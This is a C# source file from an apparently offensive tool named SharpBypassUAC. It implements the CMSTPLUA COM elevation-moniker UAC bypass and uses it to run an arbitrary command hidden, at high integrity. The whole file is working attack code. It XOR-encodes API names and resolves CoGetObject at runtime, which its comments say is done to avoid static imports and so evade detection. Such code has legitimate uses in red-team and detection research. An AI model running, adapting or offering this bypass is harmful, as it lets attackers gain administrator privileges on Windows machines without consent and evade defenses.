using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    // ICMLuaUtil COM interface (IID: 6EDD6D74-C007-4E75-B76A-E5740995E24C)
    // vtable layout after IUnknown (handled by runtime):
    //   [3] SetRasCredentials
    //   [4] SetRasEntryProperties
    //   [5] DeleteRasEntry
    //   [6] LaunchInfSection
    //   [7] LaunchInfSectionEx
    //   [8] CreateLayerDirectory
    //   [9] ShellExec  <-- target method
    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ICMLuaUtil
    {
        void SetRasCredentials();
        void SetRasEntryProperties();
        void DeleteRasEntry();
        void LaunchInfSection();
        void LaunchInfSectionEx();
        void CreateLayerDirectory();
        void ShellExec(
            [MarshalAs(UnmanagedType.LPWStr)] string file,
            [MarshalAs(UnmanagedType.LPWStr)] string parameters,
            [MarshalAs(UnmanagedType.LPWStr)] string directory,
            uint fMask,
            uint nShow);
    }

    [StructLayout(LayoutKind.Sequential)]
    struct BIND_OPTS3
    {
        public uint cbStruct;
        public uint grfFlags;
        public uint grfMode;
        public uint dwTickCountDeadline;
        public uint dwTrackFlags;
        public uint dwClassContext;
        public uint locale;
        public IntPtr pServerInfo;
        public IntPtr hwnd;
    }

    /// <summary>
    /// CMSTPLUA COM elevation bypass.
    /// Uses the auto-elevate COM object CMSTPLUA (CLSID: 3E5FC7F9-9A51-4367-9063-A120244FBEC7)
    /// via elevation moniker to execute commands with high integrity, without registry modification.
    /// CoGetObject is resolved via D/Invoke to avoid static imports.
    /// </summary>
    public class CmsTPLua
    {
        // XOR key for ole32 API strings
        private static readonly byte _xk = 0x3C;

        // "ole32.dll" ^ 0x3C
        private static readonly byte[] _s0 = new byte[] { 0x53, 0x50, 0x59, 0x0F, 0x0E, 0x12, 0x58, 0x50, 0x50 };
        // "CoGetObject" ^ 0x3C
        private static readonly byte[] _s1 = new byte[] { 0x7F, 0x53, 0x7B, 0x59, 0x48, 0x73, 0x5E, 0x56, 0x59, 0x5F, 0x48 };

        // CoGetObject delegate - resolved at runtime via D/Invoke
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int CoGetObjectDelegate(
            string pszName,
            ref BIND_OPTS3 pBindOptions,
            ref Guid riid,
            out IntPtr ppv);

        public CmsTPLua(byte[] encodedCommand)
        {
            // Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);

            Console.WriteLine("[*] CMSTPLUA COM elevation bypass");

            // Resolve CoGetObject from ole32.dll via D/Invoke
            var coGetObject = W.G<CoGetObjectDelegate>(W.X(_s0, _xk), W.X(_s1, _xk));

            // Elevation moniker with CMSTPLUA CLSID
            string moniker = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

            // ICMLuaUtil IID
            Guid iid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
            bo.dwClassContext = 4; // CLSCTX_LOCAL_SERVER

            IntPtr ppv;
            int hr = coGetObject(moniker, ref bo, ref iid, out ppv);

            if (hr != 0)
            {
                Console.WriteLine("[!] CoGetObject failed: 0x" + hr.ToString("X8"));
                return;
            }

            Console.WriteLine("[+] Obtained elevated ICMLuaUtil interface");

            // Convert raw COM pointer to managed interface
            ICMLuaUtil cmlua = (ICMLuaUtil)Marshal.GetObjectForIUnknown(ppv);

            // Parse command into file + arguments
            string file;
            string parameters = null;

            if (command.StartsWith("\""))
            {
                int endQuote = command.IndexOf('"', 1);
                if (endQuote > 0)
                {
                    file = command.Substring(1, endQuote - 1);
                    if (endQuote + 2 < command.Length)
                        parameters = command.Substring(endQuote + 2);
                }
                else
                {
                    file = command.TrimStart('"');
                }
            }
            else
            {
                int spaceIdx = command.IndexOf(' ');
                if (spaceIdx > 0)
                {
                    file = command.Substring(0, spaceIdx);
                    parameters = command.Substring(spaceIdx + 1);
                }
                else
                {
                    file = command;
                }
            }

            try
            {
                // ShellExec: fMask=0, nShow=0 (SW_HIDE)
                cmlua.ShellExec(file, parameters, "C:\\Windows\\System32", 0, 0);
                Console.WriteLine("[+] Elevated command executed");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ShellExec failed: " + ex.Message);
            }
            finally
            {
                Marshal.ReleaseComObject(cmlua);
                Marshal.Release(ppv);
            }
        }
    }
}
